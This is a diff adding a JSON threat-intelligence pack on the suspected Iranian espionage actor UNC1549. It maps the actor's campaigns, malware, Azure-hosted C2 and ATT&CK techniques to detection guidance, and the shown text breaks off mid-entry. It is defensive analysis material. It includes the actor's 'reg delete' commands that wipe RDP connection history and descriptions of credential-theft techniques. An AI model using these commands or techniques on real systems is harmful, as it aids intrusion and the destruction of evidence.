@@ -1,0 +1,561 @@
+{
+  "report_title": "UNC1549 (TA455 / Smoke Sandstorm / Yellow Dev 13 — overlaps Tortoiseshell) Actor Intelligence Pack — Stage-1 CTI Extraction",
+  "source": "Mandiant / Google Cloud 'When Cats Fly: Suspected Iranian Threat Actor UNC1549 Targets Israeli and Middle East Aerospace and Defense Sectors' (2024-02-28, https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east); Google Threat Intelligence Group (GTIG) 'Frontline Intelligence: Analysis of UNC1549 TTPs, Custom Tools, and Malware Targeting the Aerospace and Defense Ecosystem' (2025, https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense); Proofpoint TA455 'Iranian threat actor mimics recruiting on LinkedIn' reporting; The Hacker News coverage (2024-02, https://thehackernews.com/2024/02/iran-linked-unc1549-hackers-target.html)",
+  "publication_date": "2026-08-30",
+  "actor": {
+    "name": "UNC1549",
+    "mitre_id": "",
+    "mitre_canonical_name": "",
+    "aliases": [
+      "TA455 (Proofpoint)",
+      "Smoke Sandstorm (Microsoft; formerly Bohrium)",
+      "Yellow Dev 13",
+      "Overlaps with Tortoiseshell / Imperial Kitten / TA456 / Crimson Sandstorm / Curium / Yellow Liderc",
+      "'Iranian Dream Job' activity cluster"
+    ],
+    "related_clusters": [
+      "Overlaps with Smoke Sandstorm (Microsoft, formerly Bohrium)",
+      "Shares infrastructure/TTP overlap with Crimson Sandstorm / Curium (IRGC-affiliated; also Imperial Kitten, TA456, Tortoiseshell, Yellow Liderc)",
+      "Proofpoint TA455 recruitment-lure cluster",
+      "'Iranian Dream Job' fake-recruitment espionage tradecraft (thematically similar to Lazarus 'Operation Dream Job' but Iran-nexus and separately attributed)"
+    ],
+    "attribution": "Suspected Iran-nexus espionage actor, assessed by Mandiant/GTIG with MEDIUM confidence to be aligned with Iranian state interests and overlapping with the IRGC-affiliated Tortoiseshell/Crimson Sandstorm ecosystem. Attribution is deliberately hedged: Mandiant tracks the cluster as UNC1549 (an uncategorized group) and notes TTP/victimology overlap with Smoke Sandstorm and Crimson Sandstorm but does not make a high-confidence IRGC identity call. Proofpoint tracks a substantially overlapping cluster as TA455. Motivation is espionage/intelligence collection against the aerospace, aviation, and defense industrial base of Israel and the broader Middle East. Overlaps should be treated as convergence indicators, not proof of a single unified operator — attribution adjudication is out of scope for this extraction.",
+    "attribution_confidence": "medium",
+    "targeted_regions_mena": [
+      "Israel",
+      "United Arab Emirates",
+      "Turkey",
+      "Qatar (Azure regions and lures reference Qatar-hosted infrastructure)",
+      "Broader Middle East"
+    ],
+    "targeted_regions_global": [
+      "India",
+      "Albania",
+      "Worldwide entities operating in the Middle East aerospace/defense sector",
+      "Third-party vendors, contractors and partners of primary targets"
+    ],
+    "targeted_sectors": [
+      "Aerospace",
+      "Aviation / airlines",
+      "Defense industrial base",
+      "Defense contractors and their third-party vendors/suppliers"
+    ],
+    "key_campaigns": [
+      {
+        "name": "Fake-recruitment spearphishing against Israeli/Middle East aerospace & defense (MINIBIKE / MINIBUS)",
+        "date": "June 2022 to February 2024 (ongoing at time of first report)",
+        "summary": "Spearphishing emails delivering links to actor-controlled fake job-recruitment websites and Israel-Hamas conflict-themed lure sites. Fake login pages mimicking legitimate companies harvest credentials; malicious payloads deploy the MINIBIKE C++ backdoor and its more capable successor MINIBUS. Backdoors establish C2 predominantly over Microsoft Azure cloud infrastructure, and the LIGHTRAIL tunneler relays traffic through Azure. Persistence and execution rely on DLL side-loading (search-order hijacking) against legitimate signed binaries. The combination of tailored job-themed lures with cloud-hosted C2 is called out by Mandiant as making prevention/detection difficult for network defenders.",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east"
+      },
+      {
+        "name": "Expanded aerospace/defense ecosystem intrusions via third-party access (GTIG Frontline)",
+        "date": "2024 to 2025",
+        "summary": "GTIG documents a surge in UNC1549 operations pivoting into aerospace/defense targets through compromised third-party vendor, contractor and partner accounts, abusing Citrix, VMware, and Azure Virtual Desktop (AVD) with VDI-breakout techniques. Post-compromise the actor deploys an expanded custom toolset — TWOSTROKE and DEEPROOT (Linux) backdoors, LIGHTRAIL/GHOSTLINE/POLLBLEND tunnelers, DCSYNCER.SLICK (DCSync), CRASHPAD (browser credential theft), SIGHTGRAB (screenshots), TRUSTTRAP (fake credential prompt) — most executed via DLL search-order hijacking of legitimate VMware/Citrix/Fortinet/Microsoft/NVIDIA software and beaconing to Azure App Service (azurewebsites.net) and Azure VM (cloudapp.azure.com) C2. Credential access via DCSync, password spraying, Kerberoasting, and AD CS abuse; lateral movement via RDP, PowerShell Remoting, SCCM remote control, and Atelier Web Remote Commander. SSH reverse tunnels, ZeroTier and ngrok provide resilient C2 with minimal host forensic footprint.",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"
+      }
+    ]
+  },
+  "threat_actors": ["UNC1549", "TA455", "Smoke Sandstorm", "Yellow Dev 13", "Tortoiseshell (overlap)", "Crimson Sandstorm (overlap)"],
+  "targeted_regions": ["Israel", "United Arab Emirates", "Turkey", "Qatar", "India", "Albania", "Broader Middle East"],
+  "targeted_sectors": ["Aerospace", "Aviation", "Defense", "Defense contractors / third-party vendors"],
+  "malware": [
+    "MINIBIKE (C++ backdoor; Azure Web Apps C2; file exfil/upload and command execution)",
+    "MINIBUS (robust successor backdoor with enhanced reconnaissance)",
+    "TWOSTROKE (C++ backdoor; SSL-encrypted TCP/443; DLL search-order hijack persistence; code-signed)",
+    "DEEPROOT (Linux Golang backdoor; multiple redundant Azure C2 domains; hex-encoded '-===-' delimited payloads)",
+    "LIGHTRAIL (Windows Golang tunneler; modified Lastenzug Socks4a proxy; Azure WebSocket C2; VGAuthCLI.exe/VGAuth.dll side-load)",
+    "GHOSTLINE (Windows Golang tunneler; go-yamux; hardcoded C2; code-signed)",
+    "POLLBLEND (C++ Windows tunneler; HTTP POST JSON registration; hardcoded servers; code-signed)",
+    "DCSYNCER.SLICK (Windows credential-dumping DCSync utility; open-source DCSyncer + Mimikatz derivative)",
+    "CRASHPAD (C++ browser credential extractor via CryptUnprotectData; explorer.exe impersonation)",
+    "SIGHTGRAB (C screenshot utility; XOR 0x41; periodic capture)",
+    "TRUSTTRAP (credential-harvesting malware showing fake Outlook/Microsoft prompt; active since ~2023)"
+  ],
+  "tooling_observed": [
+    "Fake job-recruitment / Israel-Hamas themed lure websites",
+    "Fake login/credential-harvesting pages mimicking legitimate companies",
+    "Microsoft Azure App Service (azurewebsites.net) and Azure VMs (cloudapp.azure.com) for C2",
+    "Azure Virtual Desktop (AVD), Citrix and VMware (third-party access + VDI breakout)",
+    "SCCMVNC (SCCM Remote Control abuse for VNC-like access)",
+    "Atelier Web Remote Commander (AWRC) — commercial agentless remote management",
+    "OpenSSH (ssh.exe) reverse tunnels over port 443",
+    "ZeroTier",
+    "ngrok",
+    "Active Directory Explorer (AD recon)",
+    "Invoke-Kerberoast (obfuscated)",
+    "net user / net group",
+    "Mimikatz (basis for DCSYNCER.SLICK)"
+  ],
+  "ttps": [
+    {
+      "technique_id": "T1593.001",
+      "technique_name": "Search Open Websites/Domains: Social Media",
+      "tactic": "reconnaissance",
+      "procedure_description": "Actors use social-media / professional-network recruitment personas (consistent with Proofpoint TA455 'mimics recruiting on LinkedIn' reporting) to identify and approach IT staff, administrators and defense-sector employees for job-themed social engineering.",
+      "observed_tooling": ["Fake job-recruitment / Israel-Hamas themed lure websites"],
+      "detection_feasibility": "low — off-victim social-media reconnaissance and recruiter outreach are not endpoint-observable; intel/brand-monitoring and employee-awareness candidate",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east"]
+    },
+    {
+      "technique_id": "T1590.005",
+      "technique_name": "Gather Victim Network Information: IP Addresses",
+      "tactic": "reconnaissance",
+      "procedure_description": "Before pivoting via third parties, actors review compromised inboxes and identify legitimate business processes (e.g. password-reset requests) to craft authentic-looking lures, gathering victim environment information for follow-on targeting.",
+      "observed_tooling": [],
+      "detection_feasibility": "low — reconnaissance conducted from within already-compromised mailboxes/third parties is largely invisible to the ultimate victim; hunt candidate via mailbox audit logs on compromised tenants",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1583.001",
+      "technique_name": "Acquire Infrastructure: Domains",
+      "tactic": "resource-development",
+      "procedure_description": "Actors register look-alike / thematically relevant domains for fake recruitment and lure sites (e.g. airbus.usa-careers[.]com, airplaneserviceticketings[.]com, airtravellog[.]com) used for credential harvesting and C2.",
+      "observed_tooling": ["Fake job-recruitment / Israel-Hamas themed lure websites"],
+      "detection_feasibility": "low — domain registration is off-victim; intel/hunt candidate via newly-registered-domain and look-alike-domain monitoring",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1583.006",
+      "technique_name": "Acquire Infrastructure: Web Services",
+      "tactic": "resource-development",
+      "procedure_description": "Signature tradecraft: actors provision Microsoft Azure resources — Azure App Service web apps (*.azurewebsites.net) and Azure VMs (*.cloudapp.azure.com across regions such as eastus, westus3, northeurope, uaenorth, qatarcentral) — to host backdoor C2 and tunneler endpoints, blending malicious traffic into trusted cloud infrastructure.",
+      "observed_tooling": ["Microsoft Azure App Service (azurewebsites.net) and Azure VMs (cloudapp.azure.com) for C2"],
+      "detection_feasibility": "low — the C2 is hosted on legitimate Azure infrastructure that resolves and TLS-terminates like any benign cloud service; hunt-leaning via curated actor-domain blocklists, JA3/TLS and rare-Azure-tenant beaconing analytics rather than a generic signature",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1587.001",
+      "technique_name": "Develop Capabilities: Malware",
+      "tactic": "resource-development",
+      "procedure_description": "Actors develop and iterate a bespoke malware family (MINIBIKE -> MINIBUS successor, TWOSTROKE, DEEPROOT, LIGHTRAIL, GHOSTLINE, POLLBLEND, DCSYNCER.SLICK, CRASHPAD, SIGHTGRAB, TRUSTTRAP), compiling every post-exploitation payload with a unique hash to defeat hash-based detection.",
+      "observed_tooling": ["MINIBIKE (C++ backdoor; Azure Web Apps C2; file exfil/upload and command execution)", "MINIBUS (robust successor backdoor with enhanced reconnaissance)"],
+      "detection_feasibility": "low — capability development is off-victim; per-sample unique hashing specifically defeats IOC-hash matching, pushing detection toward behavior/YARA — intel candidate",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1588.003",
+      "technique_name": "Obtain Capabilities: Code Signing Certificates",
+      "tactic": "resource-development",
+      "procedure_description": "Multiple tools (TWOSTROKE, GHOSTLINE, POLLBLEND and others) are signed with legitimate code-signing certificates to evade trust-based controls; GTIG reported the certificates for revocation.",
+      "observed_tooling": ["TWOSTROKE (C++ backdoor; SSL-encrypted TCP/443; DLL search-order hijack persistence; code-signed)"],
+      "detection_feasibility": "low — certificate acquisition is off-victim; the downstream signed-binary execution is where detection lands (see T1553.002) — intel candidate",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1566.002",
+      "technique_name": "Phishing: Spearphishing Link",
+      "tactic": "initial-access",
+      "procedure_description": "Primary initial-access vector: spearphishing emails carrying links to actor-controlled fake job-recruitment websites and Israel-Hamas conflict-themed content sites, tailored with job-themed lures relevant to the recipient's role in aerospace/defense.",
+      "observed_tooling": ["Fake job-recruitment / Israel-Hamas themed lure websites"],
+      "detection_feasibility": "medium — inbound links to newly-registered/look-alike domains are detectable via email-security URL analysis, proxy/DNS logging and user-reported phishing, but tailored lures on cloud infrastructure evade generic filtering",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east"]
+    },
+    {
+      "technique_id": "T1598.003",
+      "technique_name": "Phishing for Information: Spearphishing Link",
+      "tactic": "reconnaissance",
+      "procedure_description": "Fake login pages mimicking major companies are used to harvest victim credentials; actors also leverage compromised third-party vendor accounts and inbox contents to obtain privileged-account credentials for onward access.",
+      "observed_tooling": ["Fake login/credential-harvesting pages mimicking legitimate companies"],
+      "detection_feasibility": "medium — credential-harvest landing pages are detectable via URL/domain reputation and post-submission anomalous logons, but the collection itself happens on attacker infrastructure",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense", "https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east"]
+    },
+    {
+      "technique_id": "T1204.001",
+      "technique_name": "User Execution: Malicious Link",
+      "tactic": "execution",
+      "procedure_description": "Victims are induced to click links to fake recruitment / lure sites, initiating the credential-harvest and payload-delivery chain.",
+      "observed_tooling": ["Fake job-recruitment / Israel-Hamas themed lure websites"],
+      "detection_feasibility": "medium — link clicks are observable via proxy/DNS and browser telemetry, but distinguishing a malicious job-site click from normal browsing requires domain reputation context",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east"]
+    },
+    {
+      "technique_id": "T1204.002",
+      "technique_name": "User Execution: Malicious File",
+      "tactic": "execution",
+      "procedure_description": "The lure chain delivers a malicious payload that, when executed by the victim, deploys the MINIBIKE/MINIBUS backdoor onto the host.",
+      "observed_tooling": ["MINIBIKE (C++ backdoor; Azure Web Apps C2; file exfil/upload and command execution)", "MINIBUS (robust successor backdoor with enhanced reconnaissance)"],
+      "detection_feasibility": "medium — execution of a downloaded payload is detectable via process-creation and download-provenance (mark-of-the-web) telemetry, though the initial dropper varies per campaign",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east"]
+    },
+    {
+      "technique_id": "T1078",
+      "technique_name": "Valid Accounts",
+      "tactic": "initial-access",
+      "procedure_description": "Actors authenticate using valid compromised credentials — harvested via fake login pages, phished from third parties, or reset on-network — to access victim environments and remote services.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — valid-account logons are detectable via identity analytics (impossible travel, new device/geo, atypical MFA) but blend with legitimate access without behavioral baselining",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1199",
+      "technique_name": "Trusted Relationship",
+      "tactic": "initial-access",
+      "procedure_description": "Signature pivot: actors abuse trusted third-party vendor, contractor and partner accounts and their Citrix / VMware / Azure Virtual Desktop access to reach aerospace/defense targets, using VDI-breakout techniques to escape virtualized session restrictions into the target network.",
+      "observed_tooling": ["Azure Virtual Desktop (AVD), Citrix and VMware (third-party access + VDI breakout)"],
+      "detection_feasibility": "medium — third-party/VDI access is detectable via monitoring of vendor accounts, VDI session anomalies and unexpected process launches inside brokered sessions, but requires visibility into the trust boundary and the VDI layer",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1574.001",
+      "technique_name": "Hijack Execution Flow: DLL",
+      "tactic": "persistence",
+      "procedure_description": "Core execution/persistence mechanism across nearly the entire toolset (CRASHPAD, DCSYNCER.SLICK, GHOSTLINE, LIGHTRAIL, MINIBIKE, POLLBLEND, SIGHTGRAB, TWOSTROKE): DLL search-order hijacking against legitimate signed software (Fortigate, VMware, Citrix, Microsoft, NVIDIA). Documented example: LIGHTRAIL loaded via VGAuthCLI.exe side-loading a malicious VGAuth.dll; DCSYNCER.SLICK writes to the VMware VGAuth directory.",
+      "observed_tooling": ["LIGHTRAIL (Windows Golang tunneler; modified Lastenzug Socks4a proxy; Azure WebSocket C2; VGAuthCLI.exe/VGAuth.dll side-load)", "DCSYNCER.SLICK (Windows credential-dumping DCSync utility; open-source DCSyncer + Mimikatz derivative)"],
+      "detection_feasibility": "high — a legitimate signed binary loading an unsigned/unexpected DLL from a non-standard path (e.g. VGAuthCLI.exe loading VGAuth.dll from a writable dir, files under VMware VGAuth) is detectable via module-load (Sysmon EID 7) and signature/path-mismatch analytics; this is the strongest endpoint surface for the actor",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1553.002",
+      "technique_name": "Subvert Trust Controls: Code Signing",
+      "tactic": "stealth",
+      "procedure_description": "Backdoors and tunnelers (TWOSTROKE, GHOSTLINE, POLLBLEND) are signed with legitimate code-signing certificates so they pass signature-trust checks and appear benign.",
+      "observed_tooling": ["GHOSTLINE (Windows Golang tunneler; go-yamux; hardcoded C2; code-signed)", "POLLBLEND (C++ Windows tunneler; HTTP POST JSON registration; hardcoded servers; code-signed)"],
+      "detection_feasibility": "medium — signed malware evades trust controls, but the specific signing certificates (once identified/revoked) and signer-reputation anomalies are detectable via certificate-thumbprint watchlists and code-integrity telemetry",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1036",
+      "technique_name": "Masquerading",
+      "tactic": "stealth",
+      "procedure_description": "Malicious DLLs and output files are placed within legitimate software directories (VMware VMware Tools\\VMware VGAuth, VGAuth.dll) and Azure C2 domains are named to imitate benign IT/cloud services (vm-tools-svc, vmware-health-ms, active-internal-logs, mso-intranet-logs) to blend with normal operations.",
+      "observed_tooling": ["Microsoft Azure App Service (azurewebsites.net) and Azure VMs (cloudapp.azure.com) for C2"],
+      "detection_feasibility": "medium — files masquerading inside trusted product directories and service-like C2 hostnames are detectable via path/name baselining and file-integrity monitoring of vendor software folders",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1027.007",
+      "technique_name": "Obfuscated Files or Information: Dynamic API Resolution",
+      "tactic": "stealth",
+      "procedure_description": "Tools such as DCSYNCER.SLICK and SIGHTGRAB use dynamic/runtime API resolution from encoded strings, XOR encryption of strings and removal of printf/debug artifacts to hinder static analysis.",
+      "observed_tooling": ["DCSYNCER.SLICK (Windows credential-dumping DCSync utility; open-source DCSyncer + Mimikatz derivative)", "SIGHTGRAB (C screenshot utility; XOR 0x41; periodic capture)"],
+      "detection_feasibility": "medium — dynamic API resolution and string obfuscation are detectable via YARA/behavioral analysis (e.g. GetProcAddress loops, XOR string decoding) but require memory/behavioral inspection rather than static AV",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1027.013",
+      "technique_name": "Obfuscated Files or Information: Encrypted/Encoded File",
+      "tactic": "stealth",
+      "procedure_description": "Data and payloads are XOR-encoded/encrypted — SIGHTGRAB XORs screenshots with single-byte key 0x41; DEEPROOT hex-encodes '-===-' delimited command payloads; LIGHTRAIL uses a custom XOR hash value 0x41424344 ('ABCD').",
+      "observed_tooling": ["SIGHTGRAB (C screenshot utility; XOR 0x41; periodic capture)", "DEEPROOT (Linux Golang backdoor; multiple redundant Azure C2 domains; hex-encoded '-===-' delimited payloads)"],
+      "detection_feasibility": "medium — high-entropy/encoded artifacts (XOR-encrypted .jpg screenshots under Users\\Public) are detectable via file-entropy and content analytics with dedicated scanning",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1070.004",
+      "technique_name": "Indicator Removal: File Deletion",
+      "tactic": "defense-impairment",
+      "procedure_description": "Actors delete their utilities from disk immediately after execution to minimize forensic artifacts and defeat post-incident recovery of tooling.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — rapid file-creation-then-deletion of executables is detectable via file-system and EDR delete-event telemetry, but the window is short and requires continuous recording",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1112",
+      "technique_name": "Modify Registry",
+      "tactic": "defense-impairment",
+      "procedure_description": "Actors clear RDP connection history to erase lateral-movement traces: 'reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default /va /f' and '...\\Terminal Server Client\\Servers /f'.",
+      "observed_tooling": [],
+      "detection_feasibility": "high — deletion of the Terminal Server Client\\Default and \\Servers registry keys is a specific, high-fidelity command detectable via process command-line and registry-modification (Sysmon EID 12/13) telemetry",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1003.006",
+      "technique_name": "OS Credential Dumping: DCSync",
+      "tactic": "credential-access",
+      "procedure_description": "Actors use the custom DCSYNCER.SLICK utility (derived from open-source DCSyncer + Mimikatz) to perform DCSync directory-replication credential theft against domain controllers, executing under a compromised DC computer-account context and writing output to LOG.txt (C:\\users\\public\\ or the VMware VGAuth directory).",
+      "observed_tooling": ["DCSYNCER.SLICK (Windows credential-dumping DCSync utility; open-source DCSyncer + Mimikatz derivative)"],
+      "detection_feasibility": "high — DCSync generates directory-replication requests (DRSUAPI DsGetNCChanges / Event ID 4662 with replication GUIDs) from non-DC principals, a high-fidelity identity detection; the LOG.txt output paths add host-level corroboration",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1110.003",
+      "technique_name": "Brute Force: Password Spraying",
+      "tactic": "credential-access",
+      "procedure_description": "Actors perform password-spray attacks against the domain to obtain additional valid credentials.",
+      "observed_tooling": [],
+      "detection_feasibility": "high — password spraying (many accounts, few passwords, from a small set of sources) is detectable via authentication-failure fan-out analytics (Event ID 4625 / Azure AD sign-in logs)",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1558.003",
+      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+      "tactic": "credential-access",
+      "procedure_description": "Actors run obfuscated Invoke-Kerberoast scripts to request service tickets for offline cracking of service-account credentials.",
+      "observed_tooling": ["Invoke-Kerberoast (obfuscated)"],
+      "detection_feasibility": "high — bursts of Kerberos TGS requests (Event ID 4769) with RC4 encryption for many SPNs from one host are a well-established Kerberoasting detection",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1649",
+      "technique_name": "Steal or Forge Authentication Certificates",
+      "tactic": "credential-access",
+      "procedure_description": "Actors abuse Active Directory Certificate Services (AD CS) to obtain certificates enabling certificate-based authentication/impersonation, and abuse resource-based constrained delegation (RBCD) for directory-replication rights.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — anomalous certificate enrollment (AD CS Event IDs 4886/4887) and RBCD/msDS-AllowedToActOnBehalfOfOtherIdentity modifications are detectable via CA and directory auditing, but require AD CS logging to be enabled",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1555.003",
+      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
+      "tactic": "credential-access",
+      "procedure_description": "The CRASHPAD utility extracts encrypted browser-stored credentials via the CryptUnprotectData API while impersonating explorer.exe's privilege level; output is written to crash.log in the VMware VGAuth directory.",
+      "observed_tooling": ["CRASHPAD (C++ browser credential extractor via CryptUnprotectData; explorer.exe impersonation)"],
+      "detection_feasibility": "high — access to browser credential stores plus CryptUnprotectData usage and token impersonation of explorer.exe are detectable via EDR API/behavioral telemetry; the crash.log/config.txt paths add corroboration",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1056.002",
+      "technique_name": "Input Capture: GUI Input Capture",
+      "tactic": "credential-access",
+      "procedure_description": "The TRUSTTRAP malware displays a fake credential prompt (e.g. a spoofed Microsoft Outlook login) to trick the user into entering credentials, which are then stored in cleartext to a file.",
+      "observed_tooling": ["TRUSTTRAP (credential-harvesting malware showing fake Outlook/Microsoft prompt; active since ~2023)"],
+      "detection_feasibility": "medium — spurious credential-prompt processes and cleartext credential files are detectable via process/UI and file-write telemetry, but the fake dialog itself may resemble legitimate auth prompts",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1087",
+      "technique_name": "Account Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Actors enumerate accounts and groups using native commands (net user, net group) to map the environment for privilege escalation and lateral movement.",
+      "observed_tooling": ["net user / net group"],
+      "detection_feasibility": "medium — net user/net group enumeration is detectable via command-line logging but is common admin activity; value comes from recon-burst/process-lineage correlation",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1482",
+      "technique_name": "Domain Trust Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Actors run Active Directory Explorer to enumerate the domain, trusts and objects for reconnaissance ahead of credential theft and lateral movement.",
+      "observed_tooling": ["Active Directory Explorer (AD recon)"],
+      "detection_feasibility": "medium — AD Explorer execution and bulk LDAP/directory queries are detectable via process and directory-service query auditing, but need baselining against legitimate admin use",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "tactic": "lateral-movement",
+      "procedure_description": "RDP is the actor's most frequent lateral-movement method; they also hijack RDP sessions of identified active users to move between systems.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — internal RDP (Type-10 logon 4624) fan-out and session activity is detectable via authentication and RDP-session analytics, but blends with legitimate admin RDP without baselining",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1563.002",
+      "technique_name": "Remote Service Session Hijacking: RDP Hijacking",
+      "tactic": "lateral-movement",
+      "procedure_description": "Actors hijack existing RDP sessions of active users (e.g. via tscon/session takeover) to move laterally using another user's authenticated context.",
+      "observed_tooling": [],
+      "detection_feasibility": "high — RDP session hijacking (session reconnect to another user's session, SYSTEM-context tscon) produces distinctive session-change and logon events (4778/4779) that are high-fidelity when baselined",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1021.006",
+      "technique_name": "Remote Services: Windows Remote Management",
+      "tactic": "lateral-movement",
+      "procedure_description": "Actors use PowerShell Remoting (WinRM) to execute commands on remote hosts during lateral movement.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — WinRM/PowerShell Remoting is detectable via WinRM operational logs and wsmprovhost.exe process lineage, but overlaps with legitimate remote administration",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1072",
+      "technique_name": "Software Deployment Tools",
+      "tactic": "lateral-movement",
+      "procedure_description": "Actors abuse Microsoft SCCM Remote Control (via the SCCMVNC tool) for VNC-like remote access that can bypass user consent/notification, using enterprise management infrastructure to reach hosts.",
+      "observed_tooling": ["SCCMVNC (SCCM Remote Control abuse for VNC-like access)"],
+      "detection_feasibility": "medium — abuse of SCCM Remote Control is detectable via SCCM audit logs, CmRcService activity, and unexpected remote-control sessions, but requires SCCM-specific monitoring",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1219",
+      "technique_name": "Remote Access Software",
+      "tactic": "command-and-control",
+      "procedure_description": "Actors use commercial/remote-management tooling — Atelier Web Remote Commander (AWRC) — for reconnaissance, credential theft and malware deployment, and fall back to ZeroTier and ngrok for resilient remote access after remediation.",
+      "observed_tooling": ["Atelier Web Remote Commander (AWRC) — commercial agentless remote management", "ZeroTier", "ngrok"],
+      "detection_feasibility": "high — unsanctioned RMM/remote tools (AWRC, ZeroTier, ngrok) are detectable via process/known-binary signatures, install events and outbound connections to their service endpoints",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1213.002",
+      "technique_name": "Data from Information Repositories: SharePoint",
+      "tactic": "collection",
+      "procedure_description": "Actors browse Microsoft Teams and SharePoint to locate and download files of interest from internal collaboration repositories.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — anomalous SharePoint/Teams access and bulk downloads are detectable via M365 audit (unified audit log) analytics for unusual principals/volumes, but require cloud-app logging",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1113",
+      "technique_name": "Screen Capture",
+      "tactic": "collection",
+      "procedure_description": "The SIGHTGRAB utility autonomously captures periodic screenshots of sensitive data, saving XOR(0x41)-encrypted .jpg files under paths like C:\\Users\\Public\\Videos\\YYYY-MM-DD-HH-MM\\1.jpg and C:\\Users\\Public\\Music\\...",
